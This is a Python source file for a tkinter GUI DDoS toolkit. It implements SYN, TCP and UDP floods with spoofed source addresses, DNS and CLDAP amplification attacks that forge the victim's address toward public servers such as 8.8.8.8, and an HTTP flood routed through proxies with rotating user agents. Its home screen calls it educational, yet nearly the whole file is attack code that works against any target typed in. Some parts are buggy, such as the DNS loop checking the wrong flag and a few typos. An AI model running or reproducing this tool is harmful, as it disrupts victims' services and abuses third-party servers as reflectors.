import tkinter as tk
from scapy.all import TCP, IP, send, UDP, DNS, DNSQR, Raw
from scapy.layers.ldap import LDAP_SearchRequest 
import random
import threading
import socket
from urllib.parse import urlparse
import requests

root = tk.Tk()
root.geometry("1000x1000")

is_syn_flood=False
is_tcp_flood=False
is_udp_flood=False
is_dns_amp = False
is_cldap_amp = False
is_http_flood = False
attack_thread = None

dns_server_array = ["8.8.8.8", "1.1.1.1"]
dns_queries = ["isc.org", "google.com"]
cldap_server_array = ["10.0.0.1", "10.0.0.2"]
http_flood_endpoints = ["/", "/index.html", "/search?q=test", "/api/users", "/products", "/login", "/images/logo.png"]
http_flood_proxies = ["http://proxy1.example.com:8080", "http://proxy2.example.com:3128", "http://proxy3.example.com:80", "socks5://proxy4.example.com:1080"]
USER_AGENTS = []
with open("user_agents.txt", "r") as file:
    for line in file:
        USER_AGENTS.append(line.strip())

sidebar = tk.Frame(root, background="#303030", width=150)
content = tk.Frame(root, background="#606060")
sidebar.pack(side="left", fill="y")
content.pack(side="right", fill="both", expand=True)

home_frame = tk.Frame(content)
syn_flood_frame = tk.Frame(content)
tcp_flood_frame = tk.Frame(content)
udp_flood_frame = tk.Frame(content)
dns_amp_frame = tk.Frame(content)
cldap_amp_frame = tk.Frame(content)
http_flood_frame = tk.Frame(content)

for page in (home_frame, syn_flood_frame, tcp_flood_frame, udp_flood_frame, dns_amp_frame, cldap_amp_frame, http_flood_frame):
    page.place(relwidth=1, relheight=1)

home_btn = tk.Button(sidebar, text="Home", command=lambda:home_frame.tkraise())
syn_flood_btn = tk.Button(sidebar, text="SYN Flood", command=lambda:syn_flood_frame.tkraise())
tcp_flood_btn = tk.Button(sidebar, text="TCP Flood", command=lambda:tcp_flood_frame.tkraise())
udp_flood_btn = tk.Button(sidebar, text="UDP Flood", command=lambda:udp_flood_frame.tkraise())
dns_amp_btn = tk.Button(sidebar, text="DNS Amplification", command=lambda:dns_amp_frame.tkraise())
cldap_amp_btn = tk.Button(sidebar, text="CLDAP Amplification", command=lambda:cldap_amp_frame.tkraise())
http_flood_btn = tk.Button(sidebar, text="Http Flood", command=lambda:http_flood_frame.tkraise())

home_btn.pack()
syn_flood_btn.pack()
tcp_flood_btn.pack()
udp_flood_btn.pack()
dns_amp_btn.pack()
cldap_amp_btn.pack()
http_flood_btn.pack()

def stop_all_attacks():
    global is_syn_flood, is_tcp_flood, is_udp_flood, is_dns_amp, is_cldap_amp, is_http_flood
    is_syn_flood=False
    is_tcp_flood=False
    is_udp_flood=False
    is_dns_amp = False
    is_cldap_amp = False
    is_http_flood = False
#region Home
text = "📖 DDOS attacks with tkinter GUI for education purpose"
home_label = tk.Label(home_frame, text="Home").pack()
text_label = tk.Label(home_frame, text=text).pack()
stop_all_btn = tk.Button(home_frame, text="Stop All Attacks", command=stop_all_attacks).pack()
#endregion

def syn_flood_atk():
    global is_syn_flood
    is_syn_flood = True
    target_ip = syn_target_input.get().strip()
    try:
        hostname = urlparse(target_ip).hostname
        target_ip_address = socket.gethostbyname(hostname)
        if target_ip_address:
            target_ip = target_ip_address
        else:
            return
        pass
    except:
        print("Error")
        pass
    target_port = int(syn_port_input.get())

    def start_syn_flood():
        syn_packet_count = 0
        while is_syn_flood:
            source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            source_port = random.randint(1024, 65535)
            ip_packet = IP(src=source_ip, dst=target_ip)
            tcp_packet = TCP(sport = source_port, dport=target_port, flags="S")
            packet = ip_packet/tcp_packet

            send(packet, verbose=False)
            syn_packet_count += 1
            print(f"{syn_packet_count} Packets sent")
        pass
    attack_thread = threading.Thread(target=start_syn_flood)
    attack_thread.daemon = True
    attack_thread.start()
    pass
def stop_syn_flood():
    global is_syn_flood
    is_syn_flood = False
#region SYN flood UI
syn_flood_label = tk.Label(syn_flood_frame, text="Syn Flood Attack").pack()
syn_target_label = tk.Label(syn_flood_frame, text="🎯 Target IP / Domain")
syn_target_input = tk.Entry(syn_flood_frame, background="#333333")
syn_port_label = tk.Label(syn_flood_frame, text="∷ Target Port")
syn_port_input = tk.Entry(syn_flood_frame, background="#333333")
syn_atk_btn = tk.Button(syn_flood_frame, text="⚔ Start Attack", command=syn_flood_atk)
syn_stop_btn = tk.Button(syn_flood_frame, text="🛑 Stop Attack", command=stop_syn_flood)

syn_target_label.pack()
syn_target_input.pack()
syn_port_label.pack()
syn_port_input.pack()
syn_atk_btn.pack()
syn_stop_btn.pack()
#endregion

def tcp_flood_atk():
    global is_tcp_flood
    is_tcp_flood = True
    target_ip = tcp_target_input.get().strip()
    try:
        hostname = urlparse(target_ip).hostname
        target_ip_address = socket.gethostbyname(hostname)
        if target_ip_address:
            target_ip = target_ip_address
        else:
            return
        pass
    except:
        print("Error")
        pass
    target_port = int(tcp_port_input.get())

    def start_tcp_flood():
        tcp_packet_count = 0
        flags_arr = ["S", "SA", "A", "F", "R", "FA", "PA", "RA", "U", "P", "SFA", "SRA"]
        while is_tcp_flood:
            source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            source_port = random.randint(1024, 65535)
            ip_packet = IP(src=source_ip, dst=target_ip)
            tcp_packet = TCP(sport = source_port, dport=target_port, flags=random.choice(flags_arr))
            packet = ip_packet/tcp_packet

            send(packet, verbose=False)
            tcp_packet_count += 1
            print(f"{tcp_packet_count} Packets sent")
        pass
    attack_thread = threading.Thread(target=start_tcp_flood)
    attack_thread.daemon = True
    attack_thread.start()
    pass
def stop_tcp_flood():
    global is_tcp_flood
    is_tcp_flood = False
#region TCP flood UI
tcp_flood_label = tk.Label(tcp_flood_frame, text="TCP Flood Attack").pack()
tcp_target_label = tk.Label(tcp_flood_frame, text="🎯 Target IP / Domain")
tcp_target_input = tk.Entry(tcp_flood_frame, background="#333333")
tcp_port_label = tk.Label(tcp_flood_frame, text="Target Port")
tcp_port_input = tk.Entry(tcp_flood_frame, background="#333333")
tcp_atk_btn = tk.Button(tcp_flood_frame, text="⚔ Start Attack", command=tcp_flood_atk)
tcp_stop_btn = tk.Button(tcp_flood_frame, text="🛑 Stop Attack", command=stop_tcp_flood)

tcp_target_label.pack()
tcp_target_input.pack()
tcp_port_label.pack()
tcp_port_input.pack()
tcp_atk_btn.pack()
tcp_stop_btn.pack()
#endregion

def udp_flood_atk():
    global is_udp_flood
    is_udp_flood = True
    target_ip = udp_target_input.get().strip()
    try:
        hostname = urlparse(target_ip).hostname
        target_ip_address = socket.gethostbyname(hostname)
        if target_ip_address:
            target_ip = target_ip_address
        else:
            return
        pass
    except:
        print("Error")
        pass
    target_port = int(udp_port_input.get())

    def start_udp_flood():
        udp_packet_count = 0
        while is_udp_flood:
            source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            source_port = random.randint(1024, 65535)
            payload = b"X" * 1400
            ip_packet = IP(src=source_ip, dst=target_ip)
            udp_packet = UDP(sport = source_port, dport=target_port)
            packet = ip_packet/udp_packet/payload

            send(packet, verbose=False)
            udp_packet_count += 1
            print(f"{udp_packet_count} Packets sent")
        pass
    attack_thread = threading.Thread(target=start_udp_flood)
    attack_thread.daemon = True
    attack_thread.start()
    pass
def stop_udp_flood():
    global is_udp_flood
    is_udp_flood = False
#region UDP flood UI
udp_flood_label = tk.Label(udp_flood_frame, text="UDP Flood Attack").pack()
udp_target_label = tk.Label(udp_flood_frame, text="🎯 Target IP / Domain")
udp_target_input = tk.Entry(udp_flood_frame, background="#333333")
udp_port_label = tk.Label(udp_flood_frame, text="Target Port")
udp_port_input = tk.Entry(udp_flood_frame, background="#333333")
udp_atk_btn = tk.Button(udp_flood_frame, text="⚔ Start Attack", command=udp_flood_atk)
udp_stop_btn = tk.Button(udp_flood_frame, text="🛑 Stop Attack", command=stop_udp_flood)

udp_target_label.pack()
udp_target_input.pack()
udp_port_label.pack()
udp_port_input.pack()
udp_atk_btn.pack()
udp_stop_btn.pack()
#endregion

def add_server():
    dns_server_array.append(dns_server_input.get().strip())
    dns_server_listbox.insert(tk.END, dns_server_input.get())
    dns_server_input.delete(0, tk.END)
def remove_server():
    selected_server = dns_server_listbox.curselection()
    index = selected_server[0]
    dns_server_array.pop(index)
    dns_server_listbox.delete(index)
def add_domain():
    dns_queries.append(domains_input.get().strip())
    domains_listbox.insert(tk.END, domains_input.get().strip())
    domains_input.delete(0, tk.END)
def remove_domain():
    selected_domain = domains_listbox.curselection()
    index = selected_domain[0]
    dns_queries.pop(index)
    domains_listbox.delete(index)
def dns_amp_atk():
    global is_dns_amp
    is_dns_amp = True
    target_ip = dns_amp_target_input.get().strip()
    try:
        hostname = urlparse(target_ip).hostname
        target_ip_address = socket.gethostbyname(hostname)
        if target_ip_address:
            target_ip = target_ip_address
        else:
            return
        pass
    except:
        print("Error")
        pass

    def start_dns_amp():
        dns_query_count = 0
        while is_udp_flood:
            dns_query = DNS(rd=1, qd=DNSQR(qname=random.choice(dns_queries), qtype="ANY"))
            source_port = random.randint(1024, 65535)
            ip_packet = IP(src=target_ip, dst=random.choice(dns_server_array))
            udp_packet = UDP(sport = source_port, dport=53)
            packet = ip_packet/udp_packet/dns_query

            send(packet, verbose=False)
            dns_query_count += 1
            print(f"{dns_query_count} Packets sent")
        pass
    attack_thread = threading.Thread(target=start_dns_amp)
    attack_thread.daemon = True
    attack_thread.start()
    pass
def stop_dns_amp():
    global is_dns_amp
    is_dns_amp = False
#region DNS Amplification UI
dns_amp_target_label = tk.Label(dns_amp_frame, text="🎯 Target IP / Domain")
dns_amp_target_input = tk.Entry(dns_amp_frame, background="#333333")

dns_list_label = tk.Label(dns_amp_frame, text="DNS Servers List")
dns_server_listbox = tk.Listbox(dns_amp_frame, background="#333333")
dns_server_label = tk.Label(dns_amp_frame, text="DNS SERVER")
dns_server_input= tk.Entry(dns_amp_frame, background="#333333")
dns_server_add_btn = tk.Button(dns_amp_frame, text="Add", command=add_server)
dns_server_remove_btn = tk.Button(dns_amp_frame, text="Remove", command=remove_server)

domain_label = tk.Label(dns_amp_frame, text="Domains")
domains_listbox = tk.Listbox(dns_amp_frame, background="#333333")
domains_label = tk.Label(dns_amp_frame, text="Domain name")
domains_input= tk.Entry(dns_amp_frame, background="#333333")
domains_add_btn = tk.Button(dns_amp_frame, text="Add", command=add_domain)
domains_remove_btn = tk.Button(dns_amp_frame, text="Remove", command=remove_domain)
dns_amp_atk_btn = tk.Button(dns_amp_frame, text="Start Attack", command=dns_amp_atk)
dns_amp_stop_btn = tk.Button(dns_amp_frame, text="Stop Attack", command=stop_dns_amp)

dns_amp_target_label.pack()
dns_amp_target_input.pack()
dns_list_label.pack()
dns_server_listbox.pack()
dns_server_input.pack()
dns_server_add_btn.pack()
dns_server_remove_btn.pack()

domain_label.pack()
domains_listbox.pack()
domains_label.pack()
domains_input.pack()
domains_add_btn.pack()
domains_remove_btn.pack()
dns_amp_atk_btn.pack()
dns_amp_stop_btn.pack()

for item in dns_server_array:
    dns_server_listbox.insert(tk.END, item)
for item in dns_queries:
    domains_listbox.insert(tk.END, item)
#endregion

def add_cldap_server():
    cldap_server_array.append(cldap_server_input.get().strip())
    cldap_server_listbox.insert(tk.End, cldap_server_input.get().strip())
    cldap_server_input.delete(0, tk.End)
def remove_cldap_server():
    selected_server = cldap_server_listbox.curselection()
    index = selected_server[0]
    cldap_server_array.pop(index)
    cldap_server_listbox.delete(index)
def cldap_amp_atk():
    is_cldap_amp = True
    cldap_query = LDAP_SearchRequest(baseDN="", scope=0, deref=0, sizelimit=0, timelimit=0, typesonly=0, attributes=[])
    target_ip = cldap_target_input.get().strip()
    try:
        hostname = urlparse(target_ip).hostname
        target_ip_address = socket.gethostbyname(hostname)
        if target_ip_address:
            target_ip = target_ip_address
        else:
            return
    except:
        print("Error")
    def start_cldap_amp():
        cldap_query_count = 0
        while is_cldap_amp:
            source_port = random.randint(1024, 65535)
            ip_packet = IP(src=target_ip, dst=random.choice(cldap_server_array))
            udp_packet = UDP(sport = source_port, dport=389)
            packet = ip_packet/udp_packet/Raw(load= bytes(cldap_query))

            send(packet, verbose=False)
            cldap_query_count += 1
            print(f"{cldap_query_count} Packets sent")
        pass
    attack_thread = threading.Thread(target=start_cldap_amp)
    attack_thread.daemon = True
    attack_thread.start()
def stop_cldap_amp():
    global is_cldap_amp
    is_cldap_amp = False
#region CLDAP Amplification UI
cldap_target_label = tk.Label(cldap_amp_frame, text="🎯 Target IP / Domain")
cldap_target_input = tk.Entry(cldap_amp_frame, background="#333333")

cldap_list_label = tk.Label(cldap_amp_frame, text="CLDAP Servers List")
cldap_server_listbox = tk.Listbox(cldap_amp_frame, background="#333333")
cldap_server_label = tk.Label(cldap_amp_frame, text="CLDAP SERVER")
cldap_server_input= tk.Entry(cldap_amp_frame, background="#333333")
cldap_server_add_btn = tk.Button(cldap_amp_frame, text="Add", command=add_cldap_server)
cldap_server_remove_btn = tk.Button(cldap_amp_frame, text="Remove", command=remove_cldap_server)

domains_remove_btn = tk.Button(cldap_amp_frame, text="Remove", command=remove_domain)
cldap_atk_btn = tk.Button(cldap_amp_frame, text="Start Attack", command=cldap_amp_atk)
cldap_stop_btn = tk.Button(cldap_amp_frame, text="Stop Attack", command=stop_cldap_amp)

cldap_target_label.pack()
cldap_target_input.pack()
cldap_list_label.pack()
cldap_server_listbox.pack()
cldap_server_label.pack()
cldap_server_input.pack()
cldap_server_add_btn.pack()
cldap_server_remove_btn.pack()

cldap_atk_btn.pack()
cldap_stop_btn.pack()
for item in cldap_server_array:
    cldap_server_listbox.insert(tk.END, item)
#endregion

def add_endpoint():
    http_flood_endpoints.append(endpoint_input.get().strip())
    endpoints_listbox.insert(tk.END, endpoint_input.get().strip())
    endpoint_input.delete(0, tk.END)
def remove_endpoint():
    selected_endpoint = endpoints_listbox.curselection()
    index = selected_endpoint[0]
    http_flood_endpoints.pop(index)
    endpoints_listbox.delete(index)
def add_proxy():
    http_flood_proxies.append(proxy_input.get().strip())
    proxy_listbox.insert(tk.END, proxy_input.get().strip())
    proxy_input.delete(0, tk.END)
def remove_proxy():
    selected_proxy = proxy_listbox.curselection()
    index = selected_proxy[0]
    http_flood_proxies.pop(index)
    proxy_listbox.delete(index)
def http_flood_atk():
    is_http_flood = True
    base_url = f"http://{http_target_input.get().strip()}:80"
    def start_http_flood():
        http_request_count = 0
        while is_http_flood:
            url = base_url + random.choice(http_flood_endpoints)
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            }
            proxy = {'http': random.choice(http_flood_proxies)}
            response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
            http_request_count += 1
            print(f"[+] Sent {http_request_count} Http requests")
        pass
    attack_thread = threading.Thread(start_http_flood)
    attack_thread.daemon = True
    attack_thread.start()
def stop_http_flood():
    global is_http_flood
    is_http_flood = False
#region HTTP Flood UI
http_target_label = tk.Label(http_flood_frame, text="🎯 Target IP / Domain")
http_target_input = tk.Entry(http_flood_frame, background="#333333")

endpoint_list_label = tk.Label(http_flood_frame, text="Endpoint List")
endpoints_listbox = tk.Listbox(http_flood_frame, background="#333333")
endpoint_label = tk.Label(http_flood_frame, text="End point")
endpoint_input= tk.Entry(http_flood_frame, background="#333333")
endpoint_add_btn = tk.Button(http_flood_frame, text="Add", command=add_endpoint)
endpoint_remove_btn = tk.Button(http_flood_frame, text="Remove", command=remove_endpoint)

proxies_label = tk.Label(http_flood_frame, text="Proxies")
proxy_listbox = tk.Listbox(http_flood_frame, background="#333333")
proxy_label = tk.Label(http_flood_frame, text="Domain name")
proxy_input= tk.Entry(http_flood_frame, background="#333333")
proxy_add_btn = tk.Button(http_flood_frame, text="Add", command=add_proxy)
proxy_remove_btn = tk.Button(http_flood_frame, text="Remove", command=remove_proxy)

http_flood_atk_btn = tk.Button(http_flood_frame, text="Start Attack", command=http_flood_atk)
http_flood_stop_btn = tk.Button(http_flood_frame, text="Stop Attack", command=stop_http_flood)

http_target_label.pack()
http_target_input.pack()

endpoint_list_label.pack()
endpoints_listbox.pack()
endpoint_label.pack()
endpoint_input.pack()
endpoint_add_btn.pack()
endpoint_remove_btn.pack()

proxies_label.pack()
proxy_listbox.pack()
proxy_label.pack()
proxy_input.pack()
proxy_add_btn.pack()
proxy_remove_btn.pack()

http_flood_atk_btn.pack()
http_flood_stop_btn.pack()

for item in http_flood_endpoints:
    endpoints_listbox.insert(tk.END, item)
for item in http_flood_proxies:
    proxy_listbox.insert(tk.END, item)
#endregion

home_frame.tkraise()
root.mainloop()